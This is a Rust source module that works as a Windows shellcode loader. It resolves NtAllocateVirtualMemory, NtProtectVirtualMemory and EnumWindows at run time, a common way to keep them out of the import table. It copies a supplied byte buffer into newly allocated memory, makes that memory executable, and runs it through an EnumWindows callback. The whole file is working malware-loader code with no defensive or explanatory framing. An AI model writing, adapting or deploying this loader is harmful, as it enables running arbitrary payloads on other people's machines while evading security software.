use std::ffi::c_void;
use std::ptr;
use crate::ntapi::*;

unsafe extern "system" fn enum_callback(_hwnd: isize, lparam: isize) -> i32 {
    let f: unsafe extern "system" fn() = std::mem::transmute(lparam as usize);
    f();
    0
}

pub fn run(sc: &[u8]) -> bool {
    unsafe {
        let alloc: NtAllocateVirtualMemoryFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtAllocateVirtualMemory\0"));
        let protect: NtProtectVirtualMemoryFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtProtectVirtualMemory\0"));
        let enum_windows: EnumWindowsFn = std::mem::transmute(resolve(b"user32.dll\0", b"EnumWindows\0"));

        let mut base: *mut c_void = ptr::null_mut();
        let mut sz = sc.len();

        let status = alloc(CURRENT_PROCESS, &mut base, 0, &mut sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !nt_success(status) {
            return false;
        }

        ptr::copy_nonoverlapping(sc.as_ptr(), base as *mut u8, sc.len());

        let mut old_prot: u32 = 0;
        sz = sc.len();
        protect(CURRENT_PROCESS, &mut base, &mut sz, PAGE_EXECUTE_READ, &mut old_prot);

        enum_windows(enum_callback, base as isize);
        true
    }
}
